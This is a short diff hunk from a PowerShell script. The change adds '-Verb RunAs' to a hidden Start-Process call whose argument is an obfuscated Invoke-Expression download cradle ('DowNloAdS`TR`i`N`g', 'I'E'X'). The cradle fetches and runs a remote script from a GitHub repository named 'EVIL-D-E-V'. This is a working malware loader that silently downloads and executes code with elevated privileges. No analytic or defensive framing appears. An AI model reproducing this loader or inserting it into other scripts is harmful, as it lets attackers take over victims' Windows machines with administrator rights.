@@ -31,7 +31,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
         try {
             $code = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/download.ps1")
             $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
-            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
             exit;
         } catch {}
     }
